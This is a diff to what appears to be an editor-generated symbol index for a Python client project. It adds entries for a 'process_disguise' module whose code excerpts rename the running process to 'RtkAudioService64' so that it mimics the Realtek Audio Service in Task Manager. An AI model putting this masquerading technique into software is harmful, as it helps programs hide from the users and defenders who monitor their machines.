@@ -1296,6 +1296,14 @@
         "documentation": {}
     },
     {
+        "label": "apply_disguise",
+        "importPath": "src.utils.process_disguise",
+        "description": "src.utils.process_disguise",
+        "isExtraImport": true,
+        "detail": "src.utils.process_disguise",
+        "documentation": {}
+    },
+    {
         "label": "lexers",
         "importPath": "sphinx.highlighting",
         "description": "sphinx.highlighting",
@@ -1768,6 +1776,33 @@
         "description": "client.src.utils.password_protection",
         "peekOfCode": "def main():\n    \"\"\"Test password protection\"\"\"\n    import sys\n    pp = PasswordProtection()\n    if len(sys.argv) < 2:\n        print(\"Usage:\")\n        print(\"  python password_protection.py set <password>\")\n        print(\"  python password_protection.py verify <password>\")\n        print(\"  python password_protection.py change <old_password> <new_password>\")\n        print(\"  python password_protection.py reset <new_password>\")",
         "detail": "client.src.utils.password_protection",
+        "documentation": {}
+    },
+    {
+        "label": "change_process_name",
+        "kind": 2,
+        "importPath": "client.src.utils.process_disguise",
+        "description": "client.src.utils.process_disguise",
+        "peekOfCode": "def change_process_name(new_name: str = \"RtkAudioService64\"):\n    \"\"\"\n    Change process name visible in Task Manager\n    Args:\n        new_name: New process name (default: RtkAudioService64 to mimic Realtek Audio Service)\n    Returns:\n        bool: True if successful, False otherwise\n    \"\"\"\n    try:\n        # Try using setproctitle (needs to be installed)",
+        "detail": "client.src.utils.process_disguise",
+        "documentation": {}
+    },
+    {
+        "label": "get_disguise_name",
+        "kind": 2,
+        "importPath": "client.src.utils.process_disguise",
+        "description": "client.src.utils.process_disguise",
+        "peekOfCode": "def get_disguise_name() -> str:\n    \"\"\"\n    Get appropriate disguise name based on OS\n    Returns:\n        str: Process name to use\n    \"\"\"\n    if os.name == 'nt':\n        # Windows: Mimic Realtek Audio Service\n        return \"RtkAudioService64\"\n    else:",
+        "detail": "client.src.utils.process_disguise",
+        "documentation": {}
+    },
+    {
+        "label": "apply_disguise",
+        "kind": 2,
+        "importPath": "client.src.utils.process_disguise",
+        "description": "client.src.utils.process_disguise",
+        "peekOfCode": "def apply_disguise():\n    \"\"\"\n    Apply process disguise with appropriate name\n    Returns:\n        bool: True if successful, False otherwise\n    \"\"\"\n    disguise_name = get_disguise_name()\n    success = change_process_name(disguise_name)\n    if success:\n        print(f\"[OK] Process disguised as: {disguise_name}\")",
+        "detail": "client.src.utils.process_disguise",
         "documentation": {}
     },
     {
